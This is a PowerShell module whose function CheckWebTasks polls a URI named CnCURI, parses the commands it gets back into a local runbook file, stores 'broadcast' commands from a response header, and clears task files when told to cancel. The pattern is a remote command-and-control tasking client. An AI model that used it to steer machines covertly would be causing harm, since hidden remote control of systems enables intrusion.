$script:name=($MyInvocation.MyCommand.Name).Trim('.ps1')

function CheckWebTasks() {
	if (!(test-path $TaskDir)) {mkdir $TaskDir}
	if (!(test-path "$TaskDir\broadcast")) {mkdir "$TaskDir\broadcast"}
	#Check for published tasks
	$WebQuery=Invoke-WebRequest -Method POST -Headers $head -URI $CnCURI -UseBasicParsing
	$WebCommand=($WebQuery).content
	if ($WebCommand) {
	#Check for JSON format
	if ($WebCommand -match '{"') {
		$CmdList0=($WebCommand | convertfrom-json).psobject.properties | select name,value 
		foreach ($line in $CmdList0) {$CmdList=$line.name, $line.value }
		$CmdList=$CmdList.split(';')
		} ELSE {
			#Non-JSON
			$CmdList=$WebCommand.split(';').trim()
			}
	
	#Broadcast tasks
	$BCastCommand=$WebQuery.Headers.bcast
	if ($BCastCommand) {
		$BCastCmdList=$BCastCommand.split(';').trim()
		$BCastCmdList | out-file "$TaskDir\broadcast\broadcast.task" -force -verbose
	}
	
	#Create task runbook
	if ($CmdList[0] -eq 'Cancel') {
		Remove-Item "$TaskDir\*.*" -force -verbose
		}
	if ($CmdList) {$CmdList | out-file $runbook}
	$hash=(Get-FileHash -Algorithm sha1 $runbook).hash
	return $hash
} #End if WebCommand
	} #End function
	
write-host "$name loaded..." -ForegroundColor yellow -BackgroundColor black
